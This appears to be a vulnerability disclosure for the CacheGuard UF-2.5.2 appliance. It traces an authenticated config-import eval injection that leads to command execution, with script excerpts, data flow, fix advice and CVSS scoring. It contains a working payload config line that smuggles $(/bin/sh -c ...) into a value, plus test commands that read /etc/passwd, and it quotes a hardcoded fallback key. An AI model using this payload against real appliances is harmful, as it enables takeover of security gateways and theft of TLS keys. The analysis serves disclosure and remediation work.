# CacheGuard UF-2.5.2 — Authenticated Config-Import Eval Injection → RCE

## 1. Overview

CacheGuard is a closed-source UTM / reverse-proxy / WAF appliance (Gateway-F10-R5 data plane + Manager-G2 control plane, CacheGuard-OS UF-2.5.2). Its admin web GUI is built on Apache httpd mod_cgi with Bash CGI scripts (`.apl`) and a chrooted admin shell. An authenticated administrator can import a configuration file through the `conf-load-save` page. The `inject-conf` routine writes each configuration line into a transaction file, preserving `$(cmd)` **literally** (the `echo ${args[*]}` expansion does not trigger command substitution), and the `transaction commit` loop later evaluates each line with `eval "set -- ${line}"` — executing `$(cmd)` as code. This escalates the restricted admin shell to arbitrary command execution (CWE-94 + CWE-78 + CWE-269).

## 2. Vulnerability Summary

- **Type**: Authenticated RCE via configuration-import eval injection
- **Root cause 1 (CWE-94)**: `transaction commit` executes configuration data with `eval "set -- ${line}"`
- **Root cause 2 (CWE-78)**: `$(cmd)` command substitution inside config values executes during eval
- **Root cause 3 (CWE-269)**: the restricted admin shell does not block the allowed `conf inject` command from reaching the eval sink
- **Filter gap**: `inject-conf` blacklists only the first token (command name); values are never validated
- **Result**: authenticated admin → upload malicious config → `conf inject` → eval sink → arbitrary command execution as uid 1001 (chroot). CVSS 8.8.

## 3. Authentication Boundary

The admin GUI authentication is a `CGAuthtenticateToken` cookie (`user,date,rand,hmac`), HMAC-SHA1 keyed by `/var/run/gui-authenticate.key`. The key is regenerated randomly at every boot (`appliance-gen-gui-auth-phrase`, 32-char base62 from `$RANDOM`) and written to tmpfs; the hardcoded fallback key (`y18PMnKA1KAEr#f4xVaL6vnk0cOcrTSw`) is **inactive at runtime** (the key file always holds the random value). Token forgery is therefore infeasible — Target A (unauthenticated) RCE is dead; this vulnerability requires a real authenticated admin (Target B).

The admin shell is `/bin/apl_bash` = `bash --restricted --norc --login`: it forbids `cd`, `>` redirection, `exec`, and PATH changes — an admin normally has no arbitrary command-execution ability. The `conf inject` command itself is allowed, which is what reaches the eval sink.

## 4. Attack Surface

- **Entry**: admin Web GUI `conf-load-save` page, multipart upload of a malicious configuration file
- **Backend**: `execute-command "conf inject <uploaded_filename>"` → `conf inject` → `inject-conf` → `transaction commit`
- **Controllable**: configuration file **content** (the uploaded filename is a server-generated temp name)
- **Sink**: `eval "set -- ${line}"` in `transaction` (L267)
- **Environment**: admin chroot; `PATH` in `inject-conf` includes `/bin:/usr/bin`

## 5. Sink Identification

`transaction` script (`/usr/local/cacheguard/bin/transaction`) `commit)` case (L255-287):

```bash
commit)
    local log=${2}
    test -f ${transaction_file} || return 0
    initialise ${MANAGER_CONTEXT_ENV}
    export TRANSACTION=yes
    while read line
    do
        unset ARGS
        export ARGS
        eval "set -- ${line}"          # L267 — SINK: $(cmd) executes here
        apl_command=${0}
        push-args-1 "${@}"
        ...
        test -x ${apl_command} || continue
        transaction-exec-command ${log}
    done < ${transaction_file}
```

`${line}` is read from the transaction file (attacker-controlled config content). `$(cmd)` executes during `eval` parsing — **before** the `test -x ${apl_command}` check, which cannot block it.

## 6. Source Identification & Controllability

The transaction file content comes from `inject-conf` (`conf` script L683):

```bash
inject-conf()
{
    test -n "${1}" || return 255
    local conf_file=${1}
    local transaction_file=${ADMIN_TMP_DIR}/${USER}.transaction.conf.${$}
    rm -f ${transaction_file}
    local path=${PATH}
    PATH=${COMMAND_PATH}:${path}        # includes /bin:/usr/bin
    ...
    while read -a args
    do
        cg_command=${args[0]}
        test -n "${cg_command}" || continue
        test ${cg_command:0:1} != "#" || continue
        case ${cg_command} in
            apply|countrylist|cancel|conf|'exit'|file|halt|'help'|'history'|license|reboot|ping|quit|register|setup|timezonelist|transaction)
                continue ;;             # command-name blacklist ONLY
            ...
        esac
        echo ${args[*]} >> ${transaction_file}   # literal preserve of $(cmd)
    done < ${conf_file}
    transaction close
    test ! -s ${transaction_file} || transaction open < ${transaction_file}
    transaction commit log
    ...
}
```

The source is the uploaded configuration content. `echo ${args[*]}` performs variable expansion but **not** command substitution, so `$(cmd)` is written literally to the transaction file. The blacklist only filters the command name (`apply|conf|exit|...`), never the value — `ip external 1.2.3.4$(cmd)` passes because `ip` is not blacklisted.

## 7. Data Flow

```
admin (authenticated)
  → Web GUI conf-load-save multipart upload of malicious config
    (conf-load-save-core.apl upload case: execute-command "conf inject ${uploaded_filename}")
  → conf inject <file> (admin-rights gate passes)
    → inject-conf ${ADMIN_TMP_DIR}/${file_name}
      → echo ${args[*]} >> transaction_file (literal $(cmd) preserved)
      → transaction commit log
        → eval "set -- ${line}" (transaction L267)
          → $(cmd) executes → arbitrary command execution (uid 1001 in chroot)
```

## 8. Exploit Construction

Malicious config file content:

```text
ip external 1.2.3.4$(/bin/sh -c "id > /tmp/cg_rce_marker.txt 2>&1; echo RCE_CONFIRMED >> /tmp/cg_rce_marker.txt")
```

- `ip` is not on the blacklist → passes `inject-conf`
- `$(/bin/sh -c "...")` is written literally (echo does not eval)
- `transaction commit` `eval "set -- ${line}"` executes `$(/bin/sh -c "...")`
- PATH includes `/bin:/usr/bin` (conf L693) → `/bin/sh` resolvable
- The marker file is the RCE evidence

## 9. Dynamic Verification

Second review (real `transaction commit` eval loop, inside the chroot):

- `$(cat /etc/passwd)` → `/tmp/EVAL_LOOP_RCE_PROOF.txt` created (203 B = /etc/passwd content)
- `$(/bin/sh -c "echo EVAL_LOOP_RCE_SUCCESS")` → `/tmp/EVAL_LOOP_RCE_SH.txt` created (22 B)

Bridge test (replicating `inject-conf` echo + `transaction` eval):

- STEP 1 (inject-conf L741 echo mode): the line is written **literally** to the simulation transaction file; the marker is absent — confirming `echo` does not trigger command substitution.
- STEP 2 (transaction L267 eval mode): `while read line; do eval "set -- ${line}"; done < sim_tf.txt` — the marker **is created** (102 B), confirming `eval` executes `$(cmd)`.

uid evidence:

```
$(/bin/sh -c "id; uname -a; echo AUTHED_RCE_CONFIRMED >> /tmp/cg_uid_marker.txt" > /tmp/cg_uid_marker.txt 2>&1)
```

The marker is created with `AUTHED_RCE_CONFIRMED`, confirming command execution as the CacheGuard web user.

## 10. Reachability & Impact

- **Reachability**: remote via the admin Web GUI over HTTPS; requires a valid admin session. The upload path (`conf-load-save`) is dynamically reachable post-authentication. The ModSecurity WAF rule skips RCE checks on the upload POST, but the RCE arrives through the file **content**, so WAF bypass is not even required.
- **Impact**: arbitrary command execution as the CacheGuard web user (uid 1001) inside the appliance chroot — gateway configuration, WAF rules, proxy/ADC behavior, and TLS keys under attacker control. An attacker who compromises an admin account can pivot from a restricted shell to full appliance control.

The `eval` sink is reached on every committed transaction, so the injection does not depend on a race condition or a specific UI state: any config line whose first token is not on the blacklist is evaluated during commit. Because the transaction loop reads lines until the file is exhausted, multiple `$(cmd)` payloads can be embedded in a single upload, and the command executes before any executable-path check on the parsed command name. This makes the primitive reliable and scriptable even through the restricted admin shell.

## 11. Fix Recommendations

1. In `inject-conf`, filter shell metacharacters (`$`, `` ` ``, `(`, `)`, `;`, `|`, `&`, `>`, `<`, `\`, `"`) in config values, or use `printf %s` instead of `echo ${args[*]}`.
2. In `transaction commit`, replace `eval "set -- ${line}"` with `read -r -a` + direct array assignment.
3. Validate config values with strict regex (e.g., `check-ip` accepting only `\d+\.\d+\.\d+\.\d+`) before writing the transaction file.

## 12. CWE & CVSS

- **CWE-94**: Improper Control of Generation of Code (config data evaluated as code)
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command (`$(cmd)` via eval)
- **CWE-269**: Improper Privilege Management (restricted admin → arbitrary code execution)
- **CVSS**: 8.8 — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
